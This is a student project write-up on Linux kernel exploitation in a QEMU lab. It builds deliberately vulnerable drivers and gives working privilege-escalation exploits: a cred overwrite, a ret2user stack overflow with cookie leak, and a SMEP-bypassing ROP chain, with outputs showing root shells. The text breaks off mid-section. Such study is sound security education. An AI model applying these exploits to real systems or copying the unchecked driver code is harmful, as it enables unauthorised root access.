# Semester project 2021 - Linux kernel mitigations

## Table of contents

* [Creating the enviornment and the first kernel module](#creating-the-enviornment-and-the-first-kernel-module)  
	 * [Installing qemu](#installing-qemu)  
	 * [Building linux kernel](#building-linux-kernel)  
	 * [Compiling buildroot](#compiling-buildroot)  
	 * [Boot script and testing](#boot-script-and-testing)  
	 * [GDB](#gdb)  
* [Device driver module and the first exploit](#device-driver-module-and-the-first-exploit)  
	 * [Device file](#device-file)  
	 * [The first exploit](#the-first-exploit)   
* [Privilege escalation with driver files](#privilege-escalation-with-driver-files)   
	 * [Cleaning up previous exploit ](#cleaning-up-previous-exploit)  
	 * [Getting root shell](#getting-root-shell)  
* [Return-to-user](#return-to-user)  
	 * [Writing ioctl kernel driver](#writing-ioctl-kernel-driver)  
	 * [SMEP and SMAP](#smep-and-smap)
	 * [Getting the stack cookie](#getting-the-stack-cookie)  
	 * [Overwriting return address](#overwriting-return-address)
	 * [Privesc in userland](#privesc-in-userland)
	 * [PTI bug](#pti-bug)
* [Bypassing SMEP](#bypassing-smep)  
	 * [ROP gadgets](#rop-gadgets)  
	 * [ROP chaining](#rop-chaining)
	 * [Improving kernel module](#improving-kernel-module)
	 * [Bypass SMEP with stack pivoting](#bypass-smep-with-stack-pivoting)
* [Heap overflow](#heap-overflow)
	 * [Heap overflow primitive](#heap-overflow-primitive)  
	 * [SLUB overflow](#slub-overflow)

## Creating the enviornment and the first kernel module

### Installing qemu
sudo apt install qemu qemu-system-x86

```mkdir ~/kernel_debug  ```
// download linux source tar, extract it and rename linux-<version> to linux  
// download buildroot source archive, extract it and rename buildroot-<version> to buildroot
 

From here basically following the steps in the following website:  
https://www.nullbyte.cat/post/linux-kernel-exploit-development-environment/

### Building linux kernel
Configured everything just like on the website, but didnt apply KASan debugger and didn't disable any security features (will disable kaslr in qemu).  

##### Fixing debug issues  
On some hosts, there is a problem, where after hitting a breakpoint in the kernel module in gdb, no matter what we do, stepping will result in a totally other function, which has to do something with time. We can fix this by setting the following configurations in make menuconfig:  
```
Processor type and features -> Linux guest support -> yes
Processor type and features -> Linux guest support -> Enable paravirtualization code -> yes
Processor type and features -> Linux guest support -> KVM Guest support (including kvmclock) -> yes
Processor type and features -> Support x2apic -> yes
```  

### Compiling buildroot
Same as above, selected ext2 fs, made init script and added root and 'user' users by creating shadow and passwd files (passwords are root and user).
Set user home permission in device table:  
```echo -e '/home/user\td\t755\t1000\t100\t-\t-\t-\t-\t-' >> <kernel_debug directory>/buildroot/system/device_table.txt```  
Added kernel modules:  
(in linux folder) ```make modules_install INSTALL_MOD_PATH=<kernel_debug directory>/buildroot/overlay```  
And finally make source & make

### Boot script and testing
Wrote boot.sh and started it. Then added ssh keys with ssh-copy-id, to be able to copy files (mainly kernel modules) with scp.
Then I wrote hello.c in linux/src/hello, compiled with Makefile and copied hello.ko to the qemu machine with scp.

### GDB
First added python script to gdbinit:  
```echo "add-auto-load-safe-path `pwd`/scripts/gdb/vmlinux-gdb.py" >> ~/.gdbinit```  

Then started it:  
```gdb vmlinux```  
```gdb> target remote :1234```  

Here I installed hello.ko (insmod) and copied the address of the module:  
```cat /proc/modules | grep hello```  

```gdb> add-symbols-file src/hello/hello.ko <address copied>```   

```gdb> b *<address copied>```  
  
Then I removed hello module (rmmod) and restarted it. Now I got a breakpoint in the init_module function.

## Device driver module and the first exploit

### Device file  
I updated the original hello.c to be able to read and write data to a device file and store its content in a static buffer.  
It can be found in the folder modules/hello2, and there is another folder, which contains a user space program, that writes to this device file and reads from it.  

First I need to load the kernel module:  
```insmod hello2.ko```  

Then I need the major version of the registered character device, which I can find in dmesg:  
```
dmesg | tail   
...
[ 8253.792398] hello2 module loaded with device major number 248
```  

With this number I'm able to create a character device file for this module:  
```mknod /dev/hello2 c 248 0``` 

Now I can test the userspace program, which I compiled on the host machine and scp-d to the qemu instance:  
```
./up-test
[+] Opening device file for writing...
String to send to module:
Hello, I'm LaTsa
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
[+] The message is: Hello, I'm LaTsa
```  

Now I can remove the device file and stop the kernel module:  
```
rm -f /dev/hello2 
rmmod hello2.ko 
[ 8752.559090] Goodbye then
```

### The first exploit  
Now that we can create a character device driver, and we can read from it and write to it, it's time to do some magic with it. In the original hello2 module we user `copy_from_user` and `copy_to_user` functions, that copies data from user space memory to kernel space memory and vice versa. What if the kernel module didn't use those functions? Let's try it by replacing them with `memcpy` (as seen in the hello2_vuln module).  
To exploit this weakness, lets write a simple c program (`hello2_vuln/exploit/exploit.c`). It's basically the same as the previous up_test program, but we make a simple change: we will not use a buffer in our code to receive what we read from the device file. We set the `receive` variable to hold the address of a special structure in the kernel.  
For example we want to change the structure, that is used by the `uname` program. This structure is in `/init/version.c` file and it's name is `init_uts_ns`. `uname` uses this structure to print us the information about the system. To get the address of this data, we can use `/proc/kallsyms`:  
```
cat /proc/kallsyms | grep init_uts_ns
...
ffffffff8301a620 D init_uts_ns
```  
We basically just need to load this address in the receive variable in exploit.c, and see the magic happen. After loading the module and generating it's device file, we can try the exploit:  
```
./exploit
[+] Opening device file for writing...
String to send to module:
HELLO
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
[-] Failed to read message from the device file
```
Ok, something went wrong. If we include the `errno.h` header and use the `perror(const char*)` function, we can get what the problem is:  
```
Error: Bad address
```

That's not good. If we try to debug the issue, and put a breakpoint in the `device_read` function, we wont stop in that function. It's because we don't even get there. Which means we fail already ad the `read` function in the exploit. Check out the source code of the write syscall.  
We can find this in `fs/read_write.c`, and the function looks like this:  
```C
SYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)
{
	return ksys_read(fd, buf, count);
}
```
So it's basically just calling  the `ksys_read` function. Let's check it out. We can see, that amongst others this function is calling `vfs_read`:  
```C
ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)
{
	struct fd f = fdget_pos(fd);
	ssize_t ret = -EBADF;

	if (f.file) {
		...
		ret = vfs_read(f.file, buf, count, ppos);
		...
	}
	return ret;
}
```
Vfs_read does again many things, but we see the interesting thing in the first few lines:  
```C
ssize_t vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
	ssize_t ret;

	if (!(file->f_mode & FMODE_READ))
		return -EBADF;
	if (!(file->f_mode & FMODE_CAN_READ))
		return -EINVAL;
	if (unlikely(!access_ok(buf, count)))
	 return -EFAULT;
 ...
 ...
 ...
 }
 ```
As we can see, it's returning -EFAULT (which makes errno write Bad address) based on the value of `access_ok`. This macro can be found in `include/asm-generic/uaccess.h`. It checks, if the function sends an address from its memory space. That's what stops us at our exploit. To get around it, we can comment out the if statement in vfs_read (and in vfs_write too), recompile the kernel, and retry the exploit.  
```C
//if (unlikely(!access_ok(buf, count)))
// return -EFAULT;
```
Now if we try the exploit:  
```
 ./exploit
[+] Opening device file for writing...
String to send to module:
HELLO
[+] Writing message to the device file...
[+] Messafe successfully written into the device file!


[+] Reading from from the device file...
```  
There is no error. Now if we try `uname -a`:
```
uname -a
HELLO latsa 5.11.0 #2 SMP Thu Feb 25 14:33:41 CET 2021 x86_64 GNU/Linux
```
It's working!

## Privilege escalation with driver files  

### Cleaning up previous exploit  
To be able to use our exploit for more than abusing uname, we need to clean the code a little bit. I basically wrote two functions: `read_kernel` and `write_kernel`.  
```C
void read_kernel(void *address, const char* buffer, ssize_t size){
        check_fd();
        write_device(FD, address, size);
        read_device(FD, buffer, BUFFER_LEN);
}
```  
```C
void write_kernel(void *address, const char* str_to_send, ssize_t size){
        check_fd();
        write_device(FD, str_to_send, size);
        read_device(FD, address, size);
}
```  
In`read_kernel` we make the driver write from the given address to its buffer, and we read it into our buffer. In `write_kernel` we write something into its buffer and then read it to the desired memory address. With this the previous exploit runs even better.  
```
# ./privesc 
[+] Opening device file...
[+] Reading from target...
[+] Kernel address successfully read
Linux
[+] Writing to target...
[+] Successfully written to target! Check with uname -a
# uname -a
HELLO latsa_kernel 5.11.0 #2 SMP Wed Mar 3 11:40:39 CET 2021 x86_64 GNU/Linux
```  

### Getting root shell  

In order to get root shell, we need to set the credential of our process to root privileges. This can be done by rewriting the creds field of the task_struct of this process. So first we need to find it.  
We can do it by traversing the linked list of task_struct heads, starting from `init_task`. But of course, these structs are hidden in the kernel address space of the memory, so no user-space program can read them. That's where te kernel driver comes in.  
To get started, we need to get the address of the `init_taks`. It can be found with this command:  
```
# cat /proc/kallsyms | grep init_task
...
ffffffff82614940 D init_task
...
```  
We can use this address as a macro in our C code:  
`#define INIT_TASK 0xffffffff82614940`  
Next, we need to find offsets in the `task_struct`. We can do this by hand, or with the hand of GDB.  
```
(gdb) print (int)&((struct task_struct*)0)->tasks
$1 = 1000
(gdb) print (int)&((struct task_struct*)0)->pid
$2 = 1256
(gdb) print (int)&((struct task_struct*)0)->cred
$3 = 1696
```  
We need the offset of `tasks`, because by traversing the list of tasks we always get to this offset of the `task_struct`. So, if we need the PID of the task, we need to calculate it like this: `pointer_from_list - offset_of_task + offset_of_pid`. But I later used a more convenient way by calculating the difference between the two offsets. I used the as macros as well:  
```C
#define OFFSET_TO_HEAD 0x3e8
#define OFFSET_TO_PID 0x4e8
#define HEAD_TO_PID 0x100
#define OFFSET_TO_CRED 0x6a0
#define HEAD_TO_CRED 0x2b8
#define BUFFER_LEN 256
```  
With these offsets I could finally start writing the real exploit. First I read the `tasks` field of the `init_task` struct by adding the `tasks` offset to the previously gotten pointer:  
```C
void *target = INIT_TASK + OFFSET_TO_HEAD;
char *buf;
 
read_kernel(target, &buf, sizeof(char*));
```  

I defined pointer `buf` is used to read the content of target into. It is a char pointer, because it won't mess with pointer arithmetic. If we add 1 to it, it will only jump one byte forwards, not 4 like with an int pointer. So I read the `tasks` field from the `init_task`. Now, to identify our process, we need to get the PID of our process:  
```C
int pid = getpid();
```  
Then we need to search for this during traversing the list. So lets read the PID field of the task_struct, which is now in buf:  
```C
int pid_of_task = 0;
read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
``` 
Now we have all what we need to traverse the task list. This is done in a while loop:  
```C
while(pid_of_task != pid){
    read_kernel(buf, &buf, sizeof(char*));
    read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
    printf("\t[+] PID of task: %d\n", pid_of_task);
}
```  
So in this loop I set buf to the address contained by itself, so getting the next element of the list. Then it reads the pid into `pid_of_task`. This is done, while the read PID is not our PID.  
When this is done, we need to find the `cred` field in this struct:  
```C
char *addr_to_task = buf - OFFSET_TO_HEAD;
printf("[+] Address to our task: %p\n", addr_to_task);
 
char *addr_to_cred;
read_kernel(buf + HEAD_TO_CRED, &addr_to_cred, sizeof(char*));
printf("[+] Address to cred: %p\n", addr_to_cred);
```  
So we basically calculate the address of the `cred` field, and then read the address of the cred struct from here. After this we can rewrite the uid of this cred struct to 0, thus giving it root privileges:  
```C
long long n = 0;
write_kernel(addr_to_cred, &n, sizeof(long long));
```
No we have root privileges. Now we can simply start a root shell:  
```C
system("/bin/sh");
```  

And this is it! This is how it looks in action:  

```
# id
uid=1000(user) gid=1000 groups=1000
# ./privesc 
[+] PID = 183
[+] Reading head from init_tast...
[+] Kernel read
[+] Searching for the PID of this program...
        [+] PID of task: 2
        [+] PID of task: 3
        ...
        [+] PID of task: 183
[+] Address to our task: 0xffff888004471a80
[+] Address to cred: 0xffff8880044b7300
[+] Now setting our cred to 0...
[+] Root shell gained!
# id
uid=0(root) gid=1000 groups=1000
#
```  

## Return-to-user  
### Writing ioctl kernel driver  
To start this chapter, we need an other kind of kernel driver: one, which uses ioctl to handle IO. This can be done by adding `.unlocked_ioctl` to the file operations struct:  
```C
static struct file_operations file_ops = {
        .open = device_open,
        .release = device_release,
        .unlocked_ioctl = device_ioctl
};
```  
The head of the function looks like this:  
```C
static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
```  
So, this function takes the usual file descriptor of our device file, an unsigned integer as a command, and an unsigned long as an argument. With the command we will decide, what the function will do with the arg parameter. For now, we will define two commands: `WRITE_STACK` and `READ_STACK`. These two commands are handled in a switch-case structure:  
```C
switch(cmd){
                case STACK_WRITE:{
                        printk(KERN_INFO "Stack write\n");
                        ...
                        break;
                                 }
                case STACK_READ:{
                        printk(KERN_INFO "Stack read\n");
			...
                        break;
                                }
                default:
                        printk(KERN_INFO "Unknown cmd %d\n", cmd);
        }
```
In STACK_WRITE, the driver handles the arg as a pointer to the input from user-space. This can be done, because `long` is 8 byte, which is the legth of a pointer in x86_64. The driver will assumen, that the pointer points to a structure, which has a 8 byte integer (a long), and a static char buffer, which contains a message. We will talk about these structs by the user-space program. So, STACK_WRITE takes the size from the struct with `get_user()`, and uses this length to copy the data from the static char buffer of the struct with `copy_from_user()` (I won't validate the given sizes to be able to perform buffer overflow):  
```C
get_user(size, (unsigned long *)arg);

error_count = copy_from_user(msg_buffer,(unsigned long *)(arg+8), size);
if(error_count == 0){
	return 0;
}else{
	return -EFAULT;
}
```  
`msg_buffer` is the buffer on the stack, that we are going to be using for exploitation:   
```C
int msg_buffer[256] = {0};
```  
STACK_READ does basically the same, but there is `copy_to_user()` instead of "from".  
One more trick has been used here later. Because of a safety check, we cannot read more bytes from a buffer with `copy_to_user`, than the length of the buffer. This is a check made by the compiler and there is a documentation about it: [Object Size Checking](https://gcc.gnu.org/onlinedocs/gcc/Object-Size-Checking.html)  
To get around that, we need to migrate the copy functions into another one, to hide it from the compiler. For this reason I wrote the following function:  
```C
int copy_user(void *kernel_ptr, void *user_ptr, unsigned long size, unsigned short dir){
        if(dir == OUT){
                return copy_to_user(user_ptr, kernel_ptr, size);
        }
        else{
                return copy_from_user(kernel_ptr, user_ptr, size);
        }
}
```  
And this can be used easily both in READ_STACK and in WRITE_STACK:  
```C
//WRITE_STACK
...
error_count = copy_user(msg_ptr,(unsigned long *)(arg+8), size * sizeof(int), IN);
...
//READ_STACK
...
error_count = copy_user(msg_ptr, (unsigned long*)(arg+8), size * sizeof(int), OUT);
...
```  
With this we are done with the kernel driver, we can move on to the exploitation.  

### SMEP and SMAP  
There are two kernel mitigations that will make our work harder by exploiting this driver: `Supervisor Mode Execution Prevention` (SMEP) and `Supervisor Mode Access Prevention` (SMAP). SMEP make sure, that kernel space programs cannot execute instructions in memory pages with user-space addresses, thus making it impossible, to execute arbitrary code with kernel buffer overflow. SMAP is complementing this protection by removing read and write access to user-space pages. So, with these protections we cannot access user-space memory in any way.  
SMEP and SMAP can be enabled within the CR4 control register by flipping the SMAP and SMEP bits. These features are implemented in the CPU architecture, but can be enabled and disabled on boot. For the next exploit we need to disable both for now. We can do this by modifying the boot.sh script. We just need to add `nosmep` and `nosmap`˛to the append flag.  

### Getting the stack cookie  
The exploit works this way: we perform a buffer overflow on the kernel stack, modifying the return address to an address from userland and there we will perform a privilege escalation. We can do this, because by returning from our kernel driver directly to our userland code, we will still be operating in kernel mode, and we will have the privilege to raise the privilege level of our user space program.  
First, we need to leak the stack cookie from the kernel stack to be able to perform the exploit. For that, we can use the READ_STACK ioctl command on our device driver file. For that, we need a structure, that is gonna be read by the driver:  
```C
typedef struct read_write_stack{
	unsigned long size;
	long msg[MAX_MSG];
} read_write_stack;
```  
The `MAX_MSG` macro is set to 1024, because we need something larger than the buffer in the driver (any size above 300 would suffice). To use this struct, we need to allocate it on the heap, because we need to pass a pointer to the ioctl driver.  
```C
read_write_stack* receiver = (read_write_stack*)malloc(sizeof(unsigned long) + MAX_MSG * sizeof(long));
receiver->size = 280;
```  
So, how does the STACK_READ work with our struct? The struct contains an unsigned long, that contains the size of the text in the buffer, if we write, but if we read, it means that we want to read that amount of bytes. So if we set this to a bigger size than the kernel buffer, we will leak the content of the stack.  
```C
printf("[+] Trying to read from kernel stack...\n");
ret = ioctl(fd, READ_STACK, (unsigned long)receiver);
if(ret < 0){
	printf("[-] Failed to read from kernel stack\n");
	free(receiver);
	exit(-1);
}
 ```  
From the returned data we are able to gather the stack cookie. Because we know, that the size of the buffer is 256 int, and we read it to a long array, we only need some educated to find out, that the stack cookie will be in the 129-th element of the msg buffer: the first 128 is the size of kernel buffer divided by 2 (size of int: 4 bytes, size of long: 8 bytes), and after that comes the stack cookie. That's, how we got it:  
 ```C
printf("[+] Received message\n");
printf("[+] Stack cookie: 0x%lx\n", receiver->msg[128]);
long stack_cookie = receiver->msg[128];
```  
This looks something like this while running:  
```
# ./ret2user 
[+] Opening device file...
[+] Trying to read from kernel stack...
[   36.411329] Stack read
[+] Received message
[+] Stack cookie: 0xeb9458cb2481e00
```  

### Overwriting return address  
Now, that we can read the stack and gather the stack cookie, we are able to modify the return address as well. We need to do this in two steps:  
1) Finding the return address on the kernel stack  
2) Rewriting it to an address pointig to our code    

For the first part I won't talk much about the process, but after some gdb sessions we know, that after the stack cookie comes the saved `ebp`, and then the return address. So we need a payload, that is containing 256 integers (ergo 128 longs), and after that 3 longs: 1 stack cookie that we saved, 1 dummy value and 1 address, we want to return to. That makes it 131 bytes. We can make this easily:  
```C
receiver->size = MSG_SIZE * 2;
long msg[MSG_SIZE];                                                                                                                                                            
for(int i = 0; i < MSG_SIZE;i++){
	msg[i] = 0x4141414141414141;
}

msg[MSG_SIZE-3] = stack_cookie;
...
long dummy = 0x4444444444444444;
msg[MSG_SIZE - 2] = dummy;
msg[MSG_SIZE - 1] = (long)mem;
```  
So, what is going `mem` to be? This will be the address we want to return to. For testing purposes, I allocated shared memory with mmap, filled itt with `0xcc`, which is the x86 asm code to software interrupt. So if we execute the code, the execution gets interrupted.  
```C
char interrupts[50];
for(int i = 0; i < 50; i++){
	interrupts[i] = 0xcc;
}
void *mem = mmap(0, sizeof(interrupts), PROT_EXEC|PROT_READ|PROT_WRITE, MAP_SHARED | MAP_ANON, -1, 0);
if((long)mem == -1){
	printf("[-] Could not perform mmap\n");
	perror("MMAP: ");
	exit(-1);
}
  
memcpy(mem, interrupts, sizeof(interrupts));
```  
Let's try this program:  
```
# ./ret2user 
[+] Opening device file...
[+] Trying to read from kernel stack...
[   98.291866] Stack read
[+] Received message
[+] Stack cookie: 0xa8f7a31592c92f00
[+] Address of interrupt zone: 0x0x7f5052f38000
[   98.297817] Stack write
```  
At this point the execution is stopped, because I put a breakpoint before the return of the stack read. After returning, we can observe these instructions in gdb:  
```
► 0x7f5052f38000    int3    <SYS_read>
        fd: 0xffffc9000025bf18 ◂— 0
        buf: 0x5590d97ff6d0 ◂— 0
        nbytes: 0x0
   0x7f5052f38001    int3   
   0x7f5052f38002    int3   
   0x7f5052f38003    int3   
   0x7f5052f38004    int3   
   0x7f5052f38005    int3   
   0x7f5052f38006    int3   
   0x7f5052f38007    int3   
   0x7f5052f38008    int3   
   0x7f5052f38009    int3   
   0x7f5052f3800a    int3
```   
Because the syscalls are called with software interrupts and there is still junk on the stack (we never removed the stack of the ioctl program), the os want's to make the `read` syscall, which has the number 0. But because we don't give it good parameters, it will result in a segmentation fault. But still, as you can see, we returned to the user space, and it still executes, so we can move on to the exploitation. Btw, we get kernel panic after this run (we can see the CR4 register with turned off SMEP and SMAP bits too):  
```
[   98.316673] int3: 0000 [#1] SMP NOPTI
[   98.317604] CPU: 0 PID: 148 Comm: ret2user Tainted: G           O      5.11.0 #3
[   98.317617] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   98.317623] RIP: 0010:0x7f5052f38001
[   98.317627] Code: Unable to access opcode bytes at RIP 0x7f5052f37fd7.
...
[   98.325097] CR2: 00007f5052f38000 CR3: 00000000044e6000 CR4: 00000000000006f0
[   98.325100] Kernel panic - not syncing: Fatal exception in interrupt
[   98.325416] Kernel Offset: disabled
```  
### Privesc in userland  
In order to get root shell, we need to evelate our privileges in the exploit program, then open a shell from within. Because we can execute user space code from the kernel, we can easily call two kernel functions to achieve this: `commit_creds()` and `prepare_kernel_cred()`. If we call these like `commit_creds(prepare_kernel_cred(0))` we basically evelate the privileges of our process to root. 
One way to call them is inline assembly. For that, we need to find the addresses of these functions. Because these are kernel functions, we can find them in `/proc/kallsyms` and they will have the same addresses in same kernel versions (if KASLR is not active):  
```
# cat /proc/kallsyms | grep commit_creds
ffffffff81089b50 T commit_creds
...
# cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff81089f90 T prepare_kernel_cred
...
```  
With these addresses we can write a simple assembly code to do the job:  
```C
void privesc(){
	__asm__(
		".intel_syntax noprefix;" // setting intel syntax
		"movabs rax, 0xffffffff81089f90;"  // prepare_kernel_cred 
		"xor rdi, rdi;" // 0 as parameter
		"call rax;" // calling prepare_kernel_cred
		"mov rdi, rax;" // setting the return to the parameter of commit_creds
		"movabs rax, 0xffffffff81089b50;" // commit_creds
		"call rax;" // calling commit_creds
		".att_syntax;" // setting syntax back to at&t                                                                                                                              
	);
}
```  
And we can set the pointer to this function to the return address in our payload:  
```C
msg[MSG_SIZE - 1] = (unsigned long)privesc;
```  
What this assembly code does, is loading the addresses of the functions into the `rax` register, puts the arguments into `rdi` and calls these functions. To make our job easier, we can set the assembly syntax to intel, and at the and back to at&t.  
Now we have a little problem. We cannot do anything with this exploit, because if we return to the privesc function, we will still be running in kernel mode. We cannot use this to attain root shell, we need to get back to user mode, hence the name `return to userland`. We can do this by calling the `iretq` instruction after commiting the creds. For `iretq` we need 5 parameters: `RIP`, `CS`, `SS`, `RSP` and `RFLAGS`. These are needed to continue execution in user mode. But if we try to replace them with junk, we won't be able to execute. To prevent this, we can save these before sending the payload:  
```C
unsigned long user_cs, user_ss, user_sp, user_rflags;

void save_state(){
	__asm__(
		".intel_syntax noprefix;" // setting intel syntax
		"mov user_cs, cs;" // saving address of code segment
 		"mov user_ss, ss;" // saving address of stack segment
		"mov user_sp, rsp;" // saving stack pointer
		"pushf;" // push flag register onto stack
		"pop user_rflags;" // saving flag register
		".att_syntax;"        
	);
}
```  
So we save the contents of the needed registers into variables, that we can use later in privesc. We won't save `rip` of course, because we will set it to the address of the shell spawning function:  
```C
void spawn_shell(){
	printf("[+] Returned to userland, spawning root shell...\n");
	if(getuid() == 0){
		printf("[+] Privilege level successfully escalated, spawning shell...\n");
		system("/bin/sh");
	}else{
		printf("[-] Failed to escalate privileges, exiting...\n");
		exit(-1);
	}
}
```  
With these, we can complete our privesc function:  
```C
unsigned long user_rip = (unsigned long)spawn_shell;
 
void privesc(){
	__asm__(
		...
		"call rax;" // calling commit_creds
		"swapgs;" // swapping the gs register
		"mov r15, user_ss;"
		"push r15;"
		"mov r15, user_sp;"
		"push r15;"
		"mov r15, user_rflags;"
		"push r15;"
		"mov r15, user_cs;"
		"push r15;"
		"mov r15, user_rip;"
		"push r15;"
		"iretq;" // returning to user mode                                                                                                                
		".att_syntax;" // setting syntax back to at&t
	);
}
```  
We basically pushing our saved variables onto the stack to use them as the parameters of `iretq`. One more thing: before `iretq` we need to swap the `GS` register, which is used in the linux kernel to differentiate between user mode and kernel mode. For that we are using the `swapgs` instruction before starting to pushing things to the stack.  
After we are done with these, we need to call `save_state` before sending the payload, and spawn the root shell:  
```C
save_state();
printf("[+] State saved\n");

printf("[+] Sending payload...\n");
ret = ioctl(fd, WRITE_STACK, (unsigned long)receiver);
```  
One more note: because we are using variables in the assembly code, we need to compile the code statically linked:  
`gcc -o ret2user -static ret2user.c`  
And trying the code on the target machine:  
```
# id
uid=1000(user) gid=1000 groups=1000
# ./ret2user 
[+] Opening device file...
[+] Trying to read from kernel stack...
[ 6740.890817] Stack read
[+] Received message
[+] Stack cookie: 0x3b219bf292148400
[+] State saved
[+] Sending payload...
[ 6740.893610] Stack write
[+] Returned to userland, spawning root shell...
[+] Privilege level successfully escalated, spawning shell...
# id
uid=0(root) gid=0(root)
```  
We got a root shell!  

### PTI bug  
Running this exploit on another machine seems to be broken, because running `system("/bin/sh");` triggers `pti` and exits with an Oops message. We can bypass this by adding the following things to the append flag in boot.sh:  
`spectre_v2=off nopti pti=off`  
After this, the exploit will result in a segmentation fault, because there is some errors in system(). We can replace it with `execve()`:  
```C
char *arg[2] = {"/bin/sh", NULL};
execve("/bin/sh", arg, NULL);
```  
Now the exploit works as it is supposed to.  

## Bypassing SMEP  
### ROP gadgets  
If we enable `SMEP`, we won't be able to execute code in userland pages while operating in kernel mode. If we remove `nosmep` from the append flag, and add `-cpu kvm64,+smep` to the boot script, we can try it by running the previous exploit:  
```
# ./ret2user
...
[+] Sending payload...
[   41.406885] Stack write
[   41.408142] unable to execute userspace code (SMEP?) (uid: 1000)
[   41.410915] BUG: unable to handle page fault for address: 0000000000401de5
[   41.414004] #PF: supervisor instruction fetch in kernel mode
[   41.415690] #PF: error_code(0x0011) - permissions violation
[   41.417369] PGD 4502067 P4D 4502067 PUD 452b067 PMD 444d067 PTE 2dfd025
[   41.419128] Oops: 0011 [#1] SMP NOPTI
[   41.420045] CPU: 0 PID: 147 Comm: ret2user Tainted: G           O      5.11.0 #3
...
Killed
```  
One way to bypass this is using return orientet programming (ROP). During this we search for ROP gadgets in the linux kernel, which are small assembly instructions followed by `ret` instructions. If we make a stack overflow, and we put the right addressess and contents in the right order on the stack, we will be able to do the same function as we used in the previous exploit.  
First step to this is to find ROP gadgets. We can find these using a python tool called `ROPgadget`. We can run it on the linux kernel, save it in a txt and then analyze the possible gadgets.  
```
ROPgadget --binary vmlinux > gadgets.txt
```  
### ROP chaining  
So, what do we need to do? We need to make the same thing as we did in the `privesc()` function before. We need to call `prepare_kernel_cred` with an argument of 0, then pass it to `commit_creds`. We see this in assembly in the privesc function, something like this:  
```assembly
movabs rax, 0xffffffff8108c240  ;prepare_kernel_cred 
xor rdi, rdi 			;0 as parameter
call rax 			;calling prepare_kernel_cred
mov rdi, rax			;setting the return to the parameter of commit_creds
movabs rax, 0xffffffff8108be00	;commit_creds
call rax			;calling commit_creds
```  
So we need to find gadgets, to do this code. We can make it a little simpler right now. As we know, ROP is based on gadgets ending with ret. That means instead off calling these functions, we can simply put them on the stack, and by ret we will return into these functions. As for the parameters, that is the tricky question. For `prepare_kernel_cred` we need to pass 0 within the `rdi` register. We could search for gadgets, that does this with xor or mov, but these are almost never by themselves, they usually have some instructions after that. It is much easier, if put this 0 on the stack, and with a `pop rbi` instruction we put this 0 into rbi. Let's find that gadget:  
```
cat gadgets.txt | grep ': pop rbi; ret'
...
0xffffffff81001568 : pop rdi ; ret
...
``` 
Cool. We found a perfect gadget for this. Let's save this into a variable we can use later:  
```c
unsigned long pop_rdi_ret = 0xffffffff81001568; // pop rdi; ret;
```  
Now we are done with `prepare_kernel_cred`, now we need to move the pointer this function returned into `rax`, and put it into `rdi` to use it as an argument of `commit_creds`. Well, there aren't many mov gadgets, that move content from rdi, to rax, at least not by themselves. We need to be a bit tricky.  
If we look for a gadget for this, we can find the following gadget:  
```
0xffffffff813e52e4 : mov rdi, rax ; jne 0xffffffff813e52d1 ; xor eax, eax ; ret
```  
It does what we need, but that `jne` instruction makes it a bit harder to use. A good way to bypass this is to use a gadget, to set the zero flag to 0. To do this, we need a gadget, that for example compares a register to a number. Here is an example:  
```
0xffffffff81aa2871 : cmp rdx, 8 ; jne 0xffffffff81aa284e ; ret
```  
So if we set rdx to 8, we can set the zero flag to 0, and bypass both `jne` instructions. We can use the stack again:  
```
0xffffffff8101c946 : pop rdx ; ret
```  
So we need to put the 8 on the stack with the payload, and we will be able to bypass this jne instruction, thus doing the privilege escalation. This is how this part looks like in the exploit:  
```c
msg[off++] = stack_cookie;
msg[off++] = dummy;
msg[off++] = pop_rdi_ret; 		// pop rdi; ret;
msg[off++] = 0; 			// to rdi
msg[off++] = prepare_kernel_cred;
msg[off++] = pop_rdx_ret; 		// pop rdx; ret;
msg[off++] = 8; 			// to rdx
msg[off++] = cmp_rdx_8_jne_ret; 	// cmp rdx, 8; jne; ret;
msg[off++] = mov_rdi_rax_jne_xor_ret; 	// mov rdi, rax; jne; xor eax, eax; ret;
msg[off++] = commit_creds;
```  
Now for the `swapgs` and `iretq`. We can easily find a `swapgs` gadget, but we need some trial and error until we find a working one. But I didn't find any `iretq` instructions between the rop gadgets. So I needed to search for it by hand. I used objdump for this:  
```
objdump -j .text -d vmlinux | grep iretq
ffffffff810261db:       48 cf                   iretq  
ffffffff810264ea:       48 cf                   iretq  
ffffffff81037752:       48 cf                   iretq
...
```  
There are many possibilities, but is used the first one. We don't need ret, because by setting back the user rip register, we will land wherever we want to set it. Now, it is the same as in the previous exploit. Now, we only need to pass the arguments of `iretq` on the stack, and we are done with the rop chain:  
```c
msg[off++] = swapgs_nop3_xor_ret; // swapgs; ret;
msg[off++] = iretq;
msg[off++] = user_rip;
msg[off++] = user_cs;
msg[off++] = user_rflags;
msg[off++] = user_sp;
msg[off++] = user_ss;
```  
If we try this exploit:  
```
# id
uid=1000(user) gid=1000 groups=1000
# ./smep 
[+] Opening device file...
[+] Trying to read from kernel stack...
[ 2718.524810] Stack read
[+] Received message
[+] Stack cookie: 0x6e71976933e1fa00
[+] Saving state...
[+] Sending payload...
[ 2718.528584] Stack write
[+] Returned to userland, spawning root shell...
[+] Privilege level successfully escalated, spawning shell...
/home/user # id
uid=0(root) gid=0(root)
```  
A root shell again!  

### Improving kernel module  
Now that we are familiar with stack buffer overflows, it's time to try something new. Let's add an ioctl command to our kernel driver, which calls the function, which is given as a function pointer in the parameter. This addition is in the bof2 driver.  
```C
void (*fn)(void);
...
switch(cmd){
...
	case IOCTL_FUNC:{
            printk(KERN_INFO "Call func\n");
            fn = (void (*)(void))arg;
            fn();
            break;
        }
```
An addition to this driver is the header file, which generates these cmd macros from now on:  
```C
#define IOCTL_MAGIC 0x33
#define IOCTL_READ 		_IOWR(IOCTL_MAGIC, 0, unsigned long)
#define IOCTL_WRITE 		_IOWR(IOCTL_MAGIC, 1, unsigned long)
